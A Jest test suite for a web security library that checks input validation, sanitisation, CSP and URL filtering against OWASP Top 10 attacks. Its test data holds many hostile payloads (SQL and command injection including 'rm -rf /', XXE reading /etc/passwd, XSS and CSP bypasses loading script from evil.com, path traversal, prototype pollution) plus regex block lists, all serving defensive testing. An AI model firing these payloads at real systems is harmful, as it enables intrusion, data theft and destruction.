import { SecurityManager } from '../../src/core/SecurityManager';
import { SecurityValidator } from '../../src/core/SecurityValidator';
import { SecurityAuditor } from '../../src/core/SecurityAuditor';
import { APIClient } from '../../src/core/APIClient';
import type { SecurityConfig } from '../../src/types/security';

/**
 * Comprehensive security test suite that validates the entire security system
 * against common attack vectors and security best practices
 */
describe('Comprehensive Security Test Suite', () => {
  let securityManager: SecurityManager;
  let securityValidator: SecurityValidator;
  let securityAuditor: SecurityAuditor;

  beforeEach(() => {
    securityManager = new SecurityManager({
      enableCSP: true,
      enableInputSanitization: true,
      enableXSSProtection: true,
      enableAPIKeyEncryption: true,
      strictMode: true,
      allowedDomains: ['https://api.example.com', 'https://cdn.example.com']
    });
    
    securityValidator = new SecurityValidator();
    securityAuditor = new SecurityAuditor(securityManager);
  });

  describe('OWASP Top 10 Protection', () => {
    describe('A1: Injection', () => {
      const injectionPayloads = [
        // SQL Injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        
        // NoSQL Injection
        '{"$ne": null}',
        '{"$gt": ""}',
        
        // Command Injection
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        
        // LDAP Injection
        '*)(&(objectClass=*))',
        '*)(uid=*))(|(uid=*',
        
        // XPath Injection
        "' or '1'='1",
        "'] | //user/*[contains(*,'Admin')] | ['",
        
        // Template Injection
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}'
      ];

      injectionPayloads.forEach((payload, index) => {
        it(`should prevent injection attack #${index + 1}: ${payload.substring(0, 30)}...`, () => {
          const validation = securityValidator.validateInput(payload, {
            blockedPatterns: [
              /drop\s+table/gi,
              /delete\s+from/gi,
              /union\s+select/gi,
              /\$ne|\$gt|\$lt/gi,
              /cat\s+\/etc/gi,
              /rm\s+-rf/gi,
              /\{\{.*\}\}/gi,
              /\$\{.*\}/gi,
              /<%= .* %>/gi
            ]
          });
          
          expect(validation.isValid).toBe(false);
        });
      });
    });

    describe('A2: Broken Authentication', () => {
      it('should enforce secure API key handling', () => {
        const headers = securityManager.createSecureHeaders('test-api-key');
        
        expect(headers['Authorization']).toBeDefined();
        expect(headers['X-API-Key-Encrypted']).toBe('true');
        expect(headers['X-Requested-With']).toBe('XMLHttpRequest');
      });

      it('should validate session tokens', () => {
        const validTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
          'abc123def456ghi789',
          'session_12345678901234567890'
        ];

        const invalidTokens = [
          '<script>alert(1)</script>',
          'javascript:alert(1)',
          '../../../etc/passwd'
        ];

        validTokens.forEach(token => {
          const result = securityValidator.validateInput(token, {
            pattern: /^[a-zA-Z0-9._-]+$/,
            maxLength: 500
          });
          expect(result.isValid).toBe(true);
        });

        invalidTokens.forEach(token => {
          const result = securityValidator.validateInput(token, {
            pattern: /^[a-zA-Z0-9._-]+$/
          });
          expect(result.isValid).toBe(false);
        });
      });
    });

    describe('A3: Sensitive Data Exposure', () => {
      it('should encrypt sensitive data', async () => {
        const sensitiveData = 'user-password-123';
        const encrypted = await securityManager.encryptAPIKey(sensitiveData);
        
        expect(encrypted).not.toBe(sensitiveData);
        expect(encrypted.length).toBeGreaterThan(sensitiveData.length);
      });

      it('should not log sensitive information', () => {
        const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
        const errorSpy = jest.spyOn(console, 'error').mockImplementation();
        
        // Simulate API call with sensitive data
        const apiKey = 'secret-api-key-12345';
        securityManager.createSecureHeaders(apiKey);
        
        // Check that API key is not logged
        expect(consoleSpy).not.toHaveBeenCalledWith(expect.stringContaining(apiKey));
        expect(errorSpy).not.toHaveBeenCalledWith(expect.stringContaining(apiKey));
        
        consoleSpy.mockRestore();
        errorSpy.mockRestore();
      });
    });

    describe('A4: XML External Entities (XXE)', () => {
      const xxePayloads = [
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://malicious.com/evil.dtd">]><test>&xxe;</test>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;</root>'
      ];

      xxePayloads.forEach((payload, index) => {
        it(`should prevent XXE attack #${index + 1}`, () => {
          const validation = securityValidator.validateInput(payload, {
            blockedPatterns: [
              /<!DOCTYPE/gi,
              /<!ENTITY/gi,
              /SYSTEM\s+["']/gi,
              /file:\/\/\//gi,
              /php:\/\//gi
            ]
          });
          
          expect(validation.isValid).toBe(false);
        });
      });
    });

    describe('A5: Broken Access Control', () => {
      it('should validate URLs against allowed domains', () => {
        const allowedUrls = [
          'https://api.example.com/endpoint',
          'https://cdn.example.com/image.jpg'
        ];

        const blockedUrls = [
          'https://malicious.com/steal-data',
          'http://internal-server/admin',
          'file:///etc/passwd',
          'ftp://attacker.com/upload'
        ];

        allowedUrls.forEach(url => {
          expect(securityManager.validateURL(url)).toBe(true);
        });

        blockedUrls.forEach(url => {
          expect(securityManager.validateURL(url)).toBe(false);
        });
      });

      it('should prevent path traversal attacks', () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\config\\sam',
          '/var/www/../../etc/passwd',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];

        pathTraversalPayloads.forEach(payload => {
          const validation = securityValidator.validateInput(payload, {
            blockedPatterns: [
              /\.\.\//gi,
              /\.\.\\/gi,
              /%2e%2e%2f/gi,
              /%2e%2e%5c/gi,
              /\/etc\/passwd/gi,
              /\/windows\/system32/gi
            ]
          });
          
          expect(validation.isValid).toBe(false);
        });
      });
    });

    describe('A6: Security Misconfiguration', () => {
      it('should have secure CSP configuration', () => {
        const csp = securityManager.generateCSPHeader();
        
        expect(csp).toContain("default-src 'self'");
        expect(csp).toContain("object-src 'none'");
        expect(csp).toContain("base-uri 'self'");
        expect(csp).not.toContain("'unsafe-eval'");
      });

      it('should enforce HTTPS in strict mode', () => {
        expect(securityManager.validateURL('http://example.com')).toBe(false);
        expect(securityManager.validateURL('https://example.com')).toBe(true);
      });
    });

    describe('A7: Cross-Site Scripting (XSS)', () => {
      const xssPayloads = [
        // Reflected XSS
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        
        // Stored XSS
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        
        // DOM-based XSS
        'javascript:alert("XSS")',
        'vbscript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        
        // Advanced XSS
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<base href="javascript:alert(\'XSS\')//">',
        
        // Filter evasion
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">',
        
        // Event handlers
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        
        // CSS-based XSS
        '<style>@import "javascript:alert(\'XSS\')";</style>',
        '<div style="background:url(javascript:alert(\'XSS\'))">',
        '<div style="expression(alert(\'XSS\'))">',
        
        // Protocol handlers
        '<a href="javascript:alert(\'XSS\')">Click</a>',
        '<form action="javascript:alert(\'XSS\')">',
        '<button formaction="javascript:alert(\'XSS\')">Submit</button>'
      ];

      xssPayloads.forEach((payload, index) => {
        it(`should prevent XSS attack #${index + 1}: ${payload.substring(0, 50)}...`, () => {
          const sanitized = securityManager.sanitizeInput(payload);
          const detected = securityValidator.detectXSS(payload);
          
          // Should be sanitized AND detected
          expect(detected.length).toBeGreaterThan(0);
          expect(sanitized).not.toContain('<script');
          expect(sanitized).not.toContain('javascript:');
          expect(sanitized).not.toContain('vbscript:');
          expect(sanitized).not.toMatch(/on\w+\s*=/i);
        });
      });
    });

    describe('A8: Insecure Deserialization', () => {
      const deserializationPayloads = [
        // Prototype pollution
        '{"__proto__": {"polluted": true}}',
        '{"constructor": {"prototype": {"polluted": true}}}',
        '{"prototype": {"polluted": true}}',
        
        // Function injection
        '{"func": "function(){return process.env}"}',
        '{"code": "eval(\'malicious code\')"}',
        
        // Object injection
        '{"toString": {"constructor": {"constructor": "return process"}}}',
        '{"valueOf": {"constructor": {"constructor": "return global"}}}'
      ];

      deserializationPayloads.forEach((payload, index) => {
        it(`should prevent deserialization attack #${index + 1}`, () => {
          const validation = securityValidator.validateJSON(payload);
          
          if (payload.includes('__proto__') || payload.includes('constructor') || payload.includes('prototype')) {
            expect(validation.isValid).toBe(false);
            expect(validation.errors.some(e => e.includes('prototype pollution'))).toBe(true);
          }
          
          if (payload.includes('function') || payload.includes('eval')) {
            expect(validation.warnings.some(w => w.includes('function-like strings'))).toBe(true);
          }
        });
      });
    });

    describe('A9: Using Components with Known Vulnerabilities', () => {
      it('should validate component integrity', () => {
        // Simulate checking for known vulnerable patterns
        const vulnerablePatterns = [
          'eval(',
          'Function(',
          'setTimeout(',
          'setInterval(',
          'document.write(',
          'innerHTML ='
        ];

        const safeCode = 'const result = Math.max(1, 2, 3);';
        const unsafeCode = 'eval(userInput);';

        vulnerablePatterns.forEach(pattern => {
          expect(safeCode).not.toContain(pattern);
        });

        expect(vulnerablePatterns.some(pattern => unsafeCode.includes(pattern))).toBe(true);
      });
    });

    describe('A10: Insufficient Logging & Monitoring', () => {
      it('should log security events', (done) => {
        securityValidator.addEventListener('xss_attempt', (event) => {
          expect(event.type).toBe('xss_attempt');
          expect(event.timestamp).toBeDefined();
          expect(event.severity).toBeDefined();
          expect(event.blocked).toBe(true);
          done();
        });

        securityValidator.validateInput('<script>alert(1)</script>');
      });

      it('should track multiple security event types', () => {
        const events: string[] = [];
        
        securityValidator.addEventListener('xss_attempt', () => events.push('xss'));
        securityValidator.addEventListener('invalid_input', () => events.push('invalid'));
        
        securityValidator.validateInput('<script>alert(1)</script>');
        securityValidator.validateInput('blocked content', {
          blockedPatterns: [/blocked/gi]
        });
        
        expect(events).toContain('xss');
        expect(events).toContain('invalid');
      });
    });
  });

  describe('Advanced Security Tests', () => {
    describe('Content Security Policy Bypass Attempts', () => {
      const cspBypassPayloads = [
        // Nonce bypass attempts
        '<script nonce="fake-nonce">alert(1)</script>',
        '<script nonce="">alert(1)</script>',
        
        // Base64 encoding bypass
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        
        // Dynamic script creation
        '<img src=x onerror="s=document.createElement(\'script\');s.src=\'//evil.com/xss.js\';document.head.appendChild(s)">',
        
        // Data URI bypass
        '<script src="data:text/javascript,alert(1)"></script>',
        
        // JSONP bypass
        '<script src="//evil.com/jsonp?callback=alert"></script>'
      ];

      cspBypassPayloads.forEach((payload, index) => {
        it(`should prevent CSP bypass attempt #${index + 1}`, () => {
          const detected = securityValidator.detectXSS(payload);
          expect(detected.length).toBeGreaterThan(0);
        });
      });
    });

    describe('Advanced Injection Techniques', () => {
      const advancedInjectionPayloads = [
        // Second-order injection
        "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        
        // Blind injection
        "1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
        
        // Time-based injection
        "1'; WAITFOR DELAY '00:00:05'; --",
        
        // Union-based injection
        "1' UNION SELECT username, password FROM users --",
        
        // Error-based injection
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
      ];

      advancedInjectionPayloads.forEach((payload, index) => {
        it(`should prevent advanced injection #${index + 1}`, () => {
          const validation = securityValidator.validateInput(payload, {
            blockedPatterns: [
              /insert\s+into/gi,
              /union\s+select/gi,
              /waitfor\s+delay/gi,
              /information_schema/gi,
              /substring\s*\(/gi
            ]
          });
          
          expect(validation.isValid).toBe(false);
        });
      });
    });

    describe('Prototype Pollution Variants', () => {
      const prototypePollutionPayloads = [
        '{"__proto__.polluted": true}',
        '{"constructor.prototype.polluted": true}',
        '{"__proto__": {"toString": "polluted"}}',
        '{"__proto__": {"valueOf": "polluted"}}',
        '{"__proto__": {"hasOwnProperty": "polluted"}}'
      ];

      prototypePollutionPayloads.forEach((payload, index) => {
        it(`should prevent prototype pollution variant #${index + 1}`, () => {
          const validation = securityValidator.validateJSON(payload);
          expect(validation.isValid).toBe(false);
        });
      });
    });
  });

  describe('Performance Under Attack', () => {
    it('should handle large payloads efficiently', () => {
      const largePayload = '<script>alert(1)</script>'.repeat(10000);
      
      const start = performance.now();
      const sanitized = securityManager.sanitizeInput(largePayload, { maxLength: 50000 });
      const end = performance.now();
      
      expect(end - start).toBeLessThan(1000); // Should complete within 1 second
    });

    it('should handle many small attacks efficiently', () => {
      const attacks = Array(1000).fill('<script>alert(1)</script>');
      
      const start = performance.now();
      attacks.forEach(attack => {
        securityValidator.detectXSS(attack);
      });
      const end = performance.now();
      
      expect(end - start).toBeLessThan(2000); // Should complete within 2 seconds
    });

    it('should not be vulnerable to ReDoS attacks', () => {
      // Regular expression Denial of Service payloads
      const redosPayloads = [
        'a'.repeat(100000) + '!',
        '(' + 'a'.repeat(50000) + ')*',
        'a'.repeat(50000) + 'X'
      ];

      redosPayloads.forEach(payload => {
        const start = performance.now();
        securityValidator.validateInput(payload, {
          pattern: /^[a-zA-Z0-9]*$/,
          maxLength: 10000
        });
        const end = performance.now();
        
        expect(end - start).toBeLessThan(1000); // Should not hang
      });
    });
  });

  describe('Integration Security Tests', () => {
    it('should maintain security across all components', async () => {
      const audit = await securityAuditor.performAudit();
      
      expect(audit.score).toBeGreaterThan(80); // High security score
      expect(audit.vulnerabilities.filter(v => v.severity === 'critical').length).toBe(0);
    });

    it('should pass comprehensive attack vector tests', async () => {
      const results = await securityAuditor.testAttackVectors();
      const totalTests = Object.keys(results).length;
      const passedTests = Object.values(results).filter(Boolean).length;
      
      expect(passedTests / totalTests).toBeGreaterThan(0.9); // 90% pass rate
    });

    it('should generate actionable security report', async () => {
      const report = await securityAuditor.generateSecurityReport();
      
      expect(report).toContain('Security Audit Report');
      expect(report).toContain('Overall Score:');
      expect(report).toContain('Attack Vector Test Results');
      expect(report.length).toBeGreaterThan(1000); // Comprehensive report
    });
  });
});